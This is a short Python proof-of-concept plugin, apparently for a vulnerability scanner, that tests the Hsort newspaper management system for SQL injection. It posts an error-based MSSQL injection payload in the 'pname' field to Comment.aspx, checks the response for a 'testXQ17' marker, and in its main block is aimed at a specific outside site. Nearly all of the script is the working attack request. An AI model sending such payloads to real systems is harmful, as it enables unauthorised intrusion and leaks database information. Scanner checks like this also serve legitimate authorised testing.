#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:Hsort报刊管理系统漏洞打包post注入一处
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0110055
#Author:xq17

import re
def assign(service, arg):
    if service == 'hsort':
        return True, arg
def audit(arg):
    post='author1=3&isGuest=true&content1=3&bname=111&pagenum=1&qnum=96&pname=%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))>0--&newsid=3&isnews=false'
    target=arg+'Comment.aspx'
    code, head, res, errcode, _ = curl.curl2(target,post=post) 
    if code == 200 or code ==500 and 'testXQ17' in res:
        security_hole(target)

if __name__=="__main__":
    from dummy import *
    audit(assign('hsort','http://epaper.btwhw.com/')[1])